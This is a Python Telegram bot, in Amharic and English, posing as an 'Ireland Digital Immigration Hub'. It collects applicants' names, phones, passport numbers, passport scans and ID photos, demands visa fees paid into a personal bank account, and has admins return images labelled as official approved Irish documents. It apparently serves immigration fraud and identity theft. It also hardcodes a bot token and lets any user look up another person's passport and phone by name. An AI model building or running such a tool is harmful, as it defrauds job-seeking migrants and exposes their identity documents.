import os
from datetime import datetime
import threading
from flask import Flask
import telebot
from telebot import types

# --- 1. የቦት ቅንብሮች (NEW TOKEN, ADMINS & FEES) ---
BOT_TOKEN = "8220259287:AAEMPWSBB1rfpBkk7dZOoNCmGQFBmBHBiUs"
ADMIN_IDS = [7798767361, 7705713321]

VISA_FEE = "12,000 Birr"
RENEWAL_FEE = "10,000 Birr"

# 🏦 የባንክ መረጃ
BANK_INFO_EN = "🏦 Commercial Bank of Ethiopia (CBE)\n🔢 Account: 1000744710042\n👤 Name: Samuel ademe"
BANK_INFO_AM = "🏦 የኢትዮጵያ ንግድ ባንክ (CBE)\n🔢 ሂሳብ ቁጥር: 1000744710042\n👤 ስም: Samuel ademe"

bot = telebot.TeleBot(BOT_TOKEN)
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🚀 Live CBE Bot with Admin Buttons and Strict Language Running!"

# የተጠቃሚዎች እና የአድሚኖች ጊዜያዊ መረጃ መያዣ
user_sessions = {}
admin_sessions = {}

def get_session(chat_id):
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {"lang": "en", "step": "START", "form": {}}
    return user_sessions[chat_id]

# --- 2. ቋሚ የተጠቃሚ ማውጫ ቁልፎች (Strict Language Main Menu) ---
def get_main_keyboard(lang):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    if lang == "am":
        markup.add("🔐 አዲስ የስራ ቪዛ ፎርም", "🛂 ቪዛ/ፓስፖርት ማደስ")
        markup.add("ℹ️ መረጃ (Info)", "🌐 ቋንቋ መቀየር (Language)")
        markup.add("👤 ፕሮፋይል")
    else:
        markup.add("🔐 New Work Visa Application", "🛂 Renew Visa / Passport")
        markup.add("ℹ️ Info", "🌐 Change Language")
        markup.add("👤 Profile")
    return markup

# ⬅️ ወደ ኋላ መመለሻ ቁልፍ መፍጠሪያ (Back Button Keyboard)
def get_back_keyboard(lang):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn = "⬅️ ተመለስ (Back)" if lang == "am" else "⬅️ Back"
    markup.add(btn)
    return markup

# --- 3. ቦቱ ሲጀመር መጀመሪያ የቋንቋ ምርጫ (/START) ---
@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    user_sessions[chat_id] = {"lang": "en", "step": "START", "form": {}}
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en"),
        types.InlineKeyboardButton("🇪🇹 አማርኛ", callback_data="set_lang_am")
    )
    bot.send_message(chat_id, "Welcome to Ireland Digital Immigration Hub!\nPlease select the bot language / እባክዎ የቦቱን ቋንቋ ይምረጡ፦", reply_markup=markup)

# --- 4. የቋንቋ እና የአድሚን የውስጥ ቁልፎች ማስተናገጃ (Callback Queries) ---
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    chat_id = call.message.chat.id
    session = get_session(chat_id)
    
    # የቋንቋ ምርጫ ማስተናገጃ
    if call.data.startswith("set_lang_"):
        content_lang = "am" if call.data == "set_lang_am" else "en"
        session["lang"] = content_lang
        
        welcome_text = (
            "👋 እንኳን ወደ አየርላንድ ዲጂታል የኢሚግሬሽን መካነ-አውታር በደህና መጡ!\nከታች ያሉትን ቁልፎች በመጠቀም አገልግሎት ማግኘት ይችላሉ።" 
            if content_lang == "am" else 
            "👋 Welcome to the Ireland Digital Immigration Hub!\nYou can use the menu buttons below to access our automated services."
        )
        bot.send_message(chat_id, welcome_text, reply_markup=get_main_keyboard(content_lang))
        session["step"] = "MAIN_MENU"
        bot.answer_callback_query(call.id)
        
    elif call.data == "proceed_cbe_payment":
        session["form"]["payment_method"] = "CBE Bank"
        session["step"] = "WAITING_SCREENSHOT"
        
        msg = (
            "እባክዎ ክፍያውን ፈጽመው የከፈሉበትን የሂሳብ ማረጋገጫ (Screenshot ፎቶ) እዚህ ላይ ይላኩ፦" 
            if session["lang"] == "am" else 
            "Please upload your payment receipt (Screenshot photo) here:"
        )
        bot.send_message(chat_id, msg, reply_markup=get_back_keyboard(session["lang"]))
        bot.answer_callback_query(call.id)

    # ==================== 🛠️ የአድሚን የቁልፍ ማስተናገጃዎች ====================
    elif call.data.startswith("verify_"):
        target_user_id = int(call.data.split("_")[1])
        user_sess = get_session(target_user_id)
        
        # ለተጠቃሚው ማሳወቂያ መላክ (በመረጠው ቋንቋ መሠረት)
        user_msg = (
            "የቅጽ መሙላት ሂደትዎ እየተሰራ ነው፣ እባክዎ ጥቂት ሰዓታትን ይጠብቁ።"
            if user_sess.get("lang") == "am" else
            "Your form is making. Please wait some hours."
        )
        try:
            bot.send_message(target_user_id, user_msg)
            bot.answer_callback_query(call.id, text="Verified successfully! Notification sent to user.")
            bot.send_message(chat_id, f"✅ Verified user {target_user_id} and notified them.")
        except Exception as e:
            bot.answer_callback_query(call.id, text="Error sending message.")
            bot.send_message(chat_id, f"❌ Failed to notify user: {e}")

    elif call.data.startswith("admin_send_"):
        target_user_id = int(call.data.split("_")[1])
        admin_sessions[chat_id] = {"step": "ADMIN_WAITING_PHOTO", "target_user": target_user_id}
        
        bot.send_message(chat_id, f"📸 Please upload the Stamped Official Photo/Visa or Form for user `{target_user_id}` now:")
        bot.answer_callback_query(call.id)


# --- 5. የቦቱ ዋና የጥያቄዎች እና የመልዕክት ፍሰት ---
@bot.message_handler(func=lambda message: True, content_types=['text', 'photo'])
def bot_core_logic(message):
    chat_id = message.chat.id
    
    # 🔐 ለአድሚን ለይቶ ፎቶ መላኪያ መቆጣጠሪያ መስመር
    if chat_id in ADMIN_IDS and chat_id in admin_sessions:
        if admin_sessions[chat_id].get("step") == "ADMIN_WAITING_PHOTO":
            target_id = admin_sessions[chat_id]["target_user"]
            if message.content_type != 'photo':
                bot.send_message(chat_id, "❌ Cancelled. You must upload a photo.")
                admin_sessions.pop(chat_id, None)
                return
            try:
                user_sess = get_session(target_id)
                prefix_msg = "📥 ኦፊሴላዊ የተረጋገጠ ሰነድ ከአድሚን የተላከ፦" if user_sess.get("lang") == "am" else "📥 Official Verified Stamped Document from Admin:"
                bot.send_message(target_id, prefix_msg)
                bot.send_photo(target_id, message.photo[-1].file_id, caption="Official Approved Ireland Document")
                bot.send_message(chat_id, "🎯 Stamped photo successfully forwarded to the user!")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Error sending to user: {e}")
            admin_sessions.pop(chat_id, None)
            return

    session = get_session(chat_id)
    lang = session["lang"]
    
    # ℹ️ Info ቁልፍ
    if message.text in ["ℹ️ Info", "ℹ️ መረጃ (Info)"]:
        if lang == "am":
            info_txt = f"🇮🇪 **የአየርላንድ ፖርታል መረጃ ዴስክ**\n\n• የስራ ቪዛ ክፍያ: {VISA_FEE}\n• ፓስፖርት ማደሻ ክፍያ: {RENEWAL_FEE}\n• የክፍያ አማራጭ: ንግድ ባንክ ብቻ\n• ሁኔታ: ክፍት ነው"
        else:
            info_txt = f"🇮🇪 **Ireland Portal Info desk**\n\n• Work Visa Fee: {VISA_FEE}\n• Passport Renewal Fee: {RENEWAL_FEE}\n• Gateway: CBE Bank Only\n• Status: Active"
        bot.send_message(chat_id, info_txt, parse_mode="Markdown")
        return
        
    # 🌐 Change Language ቁልፍ
    elif message.text in ["🌐 Change Language", "🌐 ቋንቋ መቀየር (Language)"]:
        start_command(message)
        return

    # 👤 Profile ቁልፍ ፍለጋ ማስጀመሪያ
    elif message.text in ["👤 Profile", "👤 ፕሮፋይል"]:
        session["step"] = "PROFILE_INPUT"
        msg = "እባክዎ መረጃዎን ለማየት ሙሉ ስምዎን ያስገቡ፦" if lang == "am" else "Please enter your Full Name to view your profile info:"
        bot.send_message(chat_id, msg, reply_markup=get_back_keyboard(lang))
        return

    # ==================== ⬅️ የ BACK BUTTON መቆጣጠሪያ ሎጂክ ====================
    if message.text and message.text in ["⬅️ Back", "⬅️ ተመለስ (Back)"]:
        current_step = session["step"]
        
        if current_step in ["VISA_Q1", "RENEW_NAME", "PROFILE_INPUT"]:
            session["step"] = "MAIN_MENU"
            bot.send_message(chat_id, "ወደ ዋናው ማውጫ ተመልሰዋል" if lang == "am" else "Returned to Main Menu", reply_markup=get_main_keyboard(lang))
            return
            
        elif current_step == "VISA_Q2":
            session["step"] = "VISA_Q1"
            markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            if lang == "am":
                markup.add("አዎ", "የለኝም", "⬅️ ተመለስ (Back)")
                bot.send_message(chat_id, "ጥያቄ 1፦ የዩኒቨርሲቲ ዲግሪ ወይም ዲፕሎማ አለዎት?", reply_markup=markup)
            else:
                markup.add("Yes", "No", "⬅️ Back")
                bot.send_message(chat_id, "Question 1: Do you possess an accredited Degree or Diploma?", reply_markup=markup)
            return
            
        elif current_step == "VISA_NAME":
            session["step"] = "VISA_Q2"
            markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            if lang == "am":
                markup.add("ከ1-3 ዓመት", "ከ3 ዓመት በላይ", "የስራ ልምድ የለኝም", "⬅️ ተመለስ (Back)")
                bot.send_message(chat_id, "ጥያቄ 2፦ የስራ ልምድዎን ይምረጡ፦", reply_markup=markup)
            else:
                markup.add("1-3 Years", "3+ Years", "No Experience", "⬅️ Back")
                bot.send_message(chat_id, "Question 2: Select your career experience timeframe:", reply_markup=markup)
            return
            
        elif current_step == "VISA_PHONE":
            session["step"] = "VISA_NAME"
            bot.send_message(chat_id, "ሙሉ ስምዎን ያስገቡ፦" if lang == "am" else "Enter your Full Name:", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "VISA_PASSPORT":
            session["step"] = "VISA_PHONE"
            bot.send_message(chat_id, "የስልክ ቁጥርዎን ያስገቡ፦" if lang == "am" else "Enter your Phone Number:", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "VISA_PHOTO":
            session["step"] = "VISA_PASSPORT"
            bot.send_message(chat_id, "የፓስፖርት ቁጥርዎን ያስገቡ፦" if lang == "am" else "Enter your Passport Number:", reply_markup=get_back_keyboard(lang))
            return

        elif current_step == "VISA_ID_PHOTO":
            session["step"] = "VISA_PHOTO"
            bot.send_message(chat_id, "እባክዎ የፓስፖርትዎን ፎቶ ኮፒ ይላኩ፦" if lang == "am" else "Please send a photo scan of your Passport:", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "RENEW_PHONE":
            session["step"] = "RENEW_NAME"
            bot.send_message(chat_id, "ሙሉ ስምዎን ያስገቡ፦" if lang == "am" else "Enter your Full Name:", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "RENEW_PASSPORT":
            session["step"] = "RENEW_PHONE"
            bot.send_message(chat_id, "የስልክ ቁጥርዎን ያስገቡ፦" if lang == "am" else "Enter your Phone Number:", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "RENEW_PHOTO":
            session["step"] = "RENEW_PASSPORT"
            bot.send_message(chat_id, "የድሮ ፓስፖርት ቁጥርዎን ያስገቡ፦" if lang == "am" else "Enter Expired Passport Number:", reply_markup=get_back_keyboard(lang))
            return

        elif current_step == "RENEW_ID_PHOTO":
            session["step"] = "RENEW_PHOTO"
            bot.send_message(chat_id, "እባክዎ አዲስ የፓስፖርት መጠን ፎቶ ይላኩ፦" if lang == "am" else "Please send a new Passport size photo:", reply_markup=get_back_keyboard(lang))
            return
            
        elif current_step == "WAITING_SCREENSHOT":
            if session["form"].get("service_type") == "Work Visa Application":
                session["step"] = "VISA_ID_PHOTO"
                bot.send_message(chat_id, "እባክዎ የማንነት መታወቂያዎን (ID) ፎቶ ይላኩ፦" if lang == "am" else "Please send a photo of your ID Card:", reply_markup=get_back_keyboard(lang))
            else:
                session["step"] = "RENEW_ID_PHOTO"
                bot.send_message(chat_id, "እባክዎ የማንነት መታወቂያዎን (ID) ፎቶ ይላኩ፦" if lang == "am" else "Please send a photo of your ID Card:", reply_markup=get_back_keyboard(lang))
            return
    # ======================================================================

    # 👤 የፕሮፋይል ፍለጋ ሂደት ስም ሲገባ ማሳያ
    if session["step"] == "PROFILE_INPUT":
        search_name = message.text.strip().lower()
        found_form = None
        
        # በሁሉም ተጠቃሚዎች ውስጥ ስሙን መፈለግ
        for uid, sess in user_sessions.items():
            if sess.get("form") and sess["form"].get("fullname", "").strip().lower() == search_name:
                found_form = sess["form"]
                break
                
        if found_form:
            if lang == "am":
                profile_msg = (
                    f"👤 **የተጠቃሚ መረጃ ፎርም**\n\n"
                    f"• ሙሉ ስም: {found_form.get('fullname')}\n"
                    f"• አገልግሎት: {found_form.get('service_type')}\n"
                    f"• ስልክ ቁጥር: {found_form.get('phone')}\n"
                    f"• ፓስፖርት: {found_form.get('passport')}\n"
                    f"• የክፍያ መጠን: {found_form.get('fee_charged')}\n"
                    f"• ቀን: {found_form.get('date')}"
                )
            else:
                profile_msg = (
                    f"👤 **USER PROFILE INFO**\n\n"
                    f"• Full Name: {found_form.get('fullname')}\n"
                    f"• Service: {found_form.get('service_type')}\n"
                    f"• Phone: {found_form.get('phone')}\n"
                    f"• Passport: {found_form.get('passport')}\n"
                    f"• Fee Level: {found_form.get('fee_charged')}\n"
                    f"• Date: {found_form.get('date')}"
                )
            bot.send_message(chat_id, profile_msg, reply_markup=get_main_keyboard(lang), parse_mode="Markdown")
        else:
            err_msg = "⚠️ በዚህ ስም የተመዘገበ መረጃ አልተገኘም!" if lang == "am" else "⚠️ No registered profile found with this name!"
            bot.send_message(chat_id, err_msg, reply_markup=get_main_keyboard(lang))
        session["step"] = "MAIN_MENU"
        return

    # 🔐 አዲስ የስራ ቪዛ ፎርም ማስጀመሪያ
    elif message.text in ["🔐 New Work Visa Application", "🔐 አዲስ የስራ ቪዛ ፎርም"]:
        session["step"] = "VISA_Q1"
        session["form"] = {"chat_id": chat_id, "service_type": "Work Visa Application", "fee_charged": VISA_FEE, "date": datetime.now().strftime("%d/%m/%Y %H:%M")}
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        if lang == "am":
            markup.add("አዎ", "የለኝም", "⬅️ ተመለስ (Back)")
            bot.send_message(chat_id, "ጥያቄ 1፦ የዩኒቨርሲቲ ዲግሪ ወይም ዲፕሎማ አለዎት?", reply_markup=markup)
        else:
            markup.add("Yes", "No", "⬅️ Back")
            bot.send_message(chat_id, "Question 1: Do you possess an accredited Degree or Diploma?", reply_markup=markup)
        return

    # 🛂 ቪዛ/ፓስፖርት ማደስ ማስጀመሪያ
    elif message.text in ["🛂 Renew Visa / Passport", "🛂 ቪዛ/ፓስፖርት ማደስ"]:
        session["step"] = "RENEW_NAME"
        session["form"] = {"chat_id": chat_id, "service_type": "Visa/Passport Renewal", "fee_charged": RENEWAL_FEE, "date": datetime.now().strftime("%d/%m/%Y %H:%M")}
        bot.send_message(chat_id, "ሙሉ ስምዎን ያስገቡ፦" if lang == "am" else "Enter your Full Name:", reply_markup=get_back_keyboard(lang))
        return

    step = session["step"]

    # ====== 📋 የስራ ቪዛ ጥያቄዎች ፍሰት ======
    if step == "VISA_Q1":
        session["form"]["has_degree"] = message.text
        session["step"] = "VISA_Q2"
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        if lang == "am":
            markup.add("ከ1-3 ዓመት", "ከ3 ዓመት በላይ", "የስራ ልምድ የለኝም", "⬅️ ተመለስ (Back)")
            bot.send_message(chat_id, "ጥያቄ 2፦ የስራ ልምድዎን ይምረጡ፦", reply_markup=markup)
        else:
            markup.add("1-3 Years", "3+ Years", "No Experience", "⬅️ Back")
            bot.send_message(chat_id, "Question 2: Select your career experience timeframe:", reply_markup=markup)
    
    elif step == "VISA_Q2":
        session["form"]["experience"] = message.text
        session["step"] = "VISA_NAME"
        bot.send_message(chat_id, "ሙሉ ስምዎን ያስገቡ፦" if lang == "am" else "Enter your Full Name:", reply_markup=get_back_keyboard(lang))
        
    elif step == "VISA_NAME":
        session["form"]["fullname"] = message.text
        session["step"] = "VISA_PHONE"
        bot.send_message(chat_id, "የስልክ ቁጥርዎን ያስገቡ፦" if lang == "am" else "Enter your Phone Number:", reply_markup=get_back_keyboard(lang))
        
    elif step == "VISA_PHONE":
        session["form"]["phone"] = message.text
        session["step"] = "VISA_PASSPORT"
        bot.send_message(chat_id, "የፓስፖርት ቁጥርዎን ያስገቡ፦" if lang == "am" else "Enter your Passport Number:", reply_markup=get_back_keyboard(lang))
        
    elif step == "VISA_PASSPORT":
        session["form"]["passport"] = message.text.strip().upper()
        session["step"] = "VISA_PHOTO"
        bot.send_message(chat_id, "እባክዎ የፓስፖርትዎን ፎቶ ኮፒ ይላኩ፦" if lang == "am" else "Please send a photo scan of your Passport:", reply_markup=get_back_keyboard(lang))
        
    elif step == "VISA_PHOTO":
        if message.content_type != 'photo':
            bot.send_message(chat_id, "⚠️ Invalid file. Upload a photo scan." if lang == "en" else "⚠️ እባክዎ ትክክለኛ ፎቶ ይላኩ።")
            return
        session["form"]["user_photo_id"] = message.photo[-1].file_id
        session["step"] = "VISA_ID_PHOTO"
        bot.send_message(chat_id, "እባክዎ የማንነት መታወቂያዎን (ID) ፎቶ ይላኩ፦" if lang == "am" else "Please send a photo of your ID Card:", reply_markup=get_back_keyboard(lang))

    elif step == "VISA_ID_PHOTO":
        if message.content_type != 'photo':
            bot.send_message(chat_id, "⚠️ Invalid file. Upload an ID photo." if lang == "en" else "⚠️ እባክዎ ትክክለኛ የመታወቂያ ፎቶ ይላኩ።")
            return
        session["form"]["user_id_photo_id"] = message.photo[-1].file_id
        ask_payment_choice(chat_id, lang, VISA_FEE)

    # ====== 🛂 የማደሻ ፎርም (Renewal) ጥያቄዎች ፍሰት ======
    elif step == "RENEW_NAME":
        session["form"]["fullname"] = message.text
        session["step"] = "RENEW_PHONE"
        bot.send_message(chat_id, "የስልክ ቁጥርዎን ያስገቡ፦" if lang == "am" else "Enter your Phone Number:", reply_markup=get_back_keyboard(lang))
    elif step == "RENEW_PHONE":
        session["form"]["phone"] = message.text
        session["step"] = "RENEW_PASSPORT"
        bot.send_message(chat_id, "የድሮ ፓስፖርት ቁጥርዎን ያስገቡ፦" if lang == "am" else "Enter Expired Passport Number:", reply_markup=get_back_keyboard(lang))
    elif step == "RENEW_PASSPORT":
        session["form"]["passport"] = message.text.strip().upper()
        session["step"] = "RENEW_PHOTO"
        bot.send_message(chat_id, "እባክዎ አዲስ የፓስፖርት መጠን ፎቶ ይላኩ፦" if lang == "am" else "Please send a new Passport size photo:", reply_markup=get_back_keyboard(lang))
    elif step == "RENEW_PHOTO":
        if message.content_type != 'photo':
            bot.send_message(chat_id, "⚠️ Please upload a valid photo." if lang == "en" else "⚠️ እባክዎ ትክክለኛ ፎቶ ያስገቡ።")
            return
        session["form"]["user_photo_id"] = message.photo[-1].file_id
        session["step"] = "RENEW_ID_PHOTO"
        bot.send_message(chat_id, "እባክዎ የማንነት መታወቂያዎን (ID) ፎቶ ይላኩ፦" if lang == "am" else "Please send a photo of your ID Card:", reply_markup=get_back_keyboard(lang))
    elif step == "RENEW_ID_PHOTO":
        if message.content_type != 'photo':
            bot.send_message(chat_id, "⚠️ Please upload an ID photo." if lang == "en" else "⚠️ እባክዎ መታወቂያ ፎቶ ያስገቡ።")
            return
        session["form"]["user_id_photo_id"] = message.photo[-1].file_id
        ask_payment_choice(chat_id, lang, RENEWAL_FEE)

    # ====== 📸 የክፍያ ማረጋገጫ ስክሪንሾት እና ለአድሚኖች ማስተላለፊያ ======
    elif step == "WAITING_SCREENSHOT":
        if message.content_type != 'photo':
            bot.send_message(chat_id, "⚠️ Please send a payment receipt screenshot!" if lang == "en" else "⚠️ እባክዎ የክፍያ ማረጋገጫ ስክሪንሾት ይላኩ!")
            return
        
        screenshot_file_id = message.photo[-1].file_id
        bot.send_message(chat_id, "Your request is being processed." if lang == "en" else "ማመልከቻዎ እየተገመገመ ነው፣ እናመሰግናለን።", reply_markup=get_main_keyboard(lang))
        
        admin_report = (
            f"🔔 **NEW REGISTRATION SUBMITTED**\n\n"
            f"👤 Name: {session['form'].get('fullname')}\n"
            f"🛂 Passport: {session['form'].get('passport')}\n"
            f"📱 Phone: {session['form'].get('phone')}\n"
            f"🎓 Degree?: {session['form'].get('has_degree', 'N/A')}\n"
            f"💼 Exp: {session['form'].get('experience', 'N/A')}\n"
            f"✨ Service: {session['form']['service_type']}\n"
            f"💰 Price: {session['form']['fee_charged']}\n"
            f"🆔 User Chat ID: `{chat_id}`"
        )
        
        # 🛠️ ለአድሚን የሚላኩ Inline ቁልፎች መፍጠሪያ
        admin_markup = types.InlineKeyboardMarkup(row_width=1)
        admin_markup.add(
            types.InlineKeyboardButton("✅ Verify Form", callback_data=f"verify_{chat_id}"),
            types.InlineKeyboardButton("📤 Send Photo/Form", callback_data=f"admin_send_{chat_id}")
        )
        
        for admin_id in ADMIN_IDS:
            try:
                bot.send_message(admin_id, admin_report, parse_mode="Markdown", reply_markup=admin_markup)
                bot.send_photo(admin_id, screenshot_file_id, caption=f"User Payment Screenshot")
                
                if "user_photo_id" in session["form"]:
                    bot.send_photo(admin_id, session["form"]["user_photo_id"], caption="📄 User Passport Photo Scan")
                if "user_id_photo_id" in session["form"]:
                    bot.send_photo(admin_id, session["form"]["user_id_photo_id"], caption="🪪 User ID Card Photo")
            except Exception as e:
                print(f"Error sending to admin {admin_id}: {e}")
        
        session["step"] = "MAIN_MENU"

# 💳 የባንክ መረጃ ማሳያ
def ask_payment_choice(chat_id, lang, fee):
    markup = types.InlineKeyboardMarkup()
    btn_text = "📸 Upload Screenshot" if lang == "en" else "📸 ስክሪንሾት ለመላክ"
    markup.add(types.InlineKeyboardButton(btn_text, callback_data="proceed_cbe_payment"))
    
    if lang == "am":
        msg = (
            f"💳 **የክፍያ ማረጋገጫ መረጃ**\n\n"
            f"{BANK_INFO_AM}\n\n"
            f"💰 **የአገልግሎት ክፍያ ሂሳብ፦ {fee}**\n\n"
            f"እባክዎ ከላይ በተጠቀሰው የባንክ አካውንት ክፍያውን ፈጽመው ሲያበቁ የክፍያ ማረጋገጫ ስክሪንሾት ለመላክ ከታች ያለውን ቁልፍ ይጫኑ።"
        )
    else:
        msg = (
            f"💳 **Payment Instructions**\n\n"
            f"{BANK_INFO_EN}\n\n"
            f"💰 **Total Required Fee: {fee}**\n\n"
            f"Please complete the bank transfer. Once paid, click the button below to upload your receipt screenshot."
        )
    bot.send_message(chat_id, msg, reply_markup=markup, parse_mode="Markdown")

def run_web_server():
    flask_app.run(host="0.0.0.0", port=7860)

if __name__ == '__main__':
    threading.Thread(target=run_web_server, daemon=True).start()
    print("🤖 Bot started successfully with strict language layouts and inline admin features!")
    bot.infinity_polling()
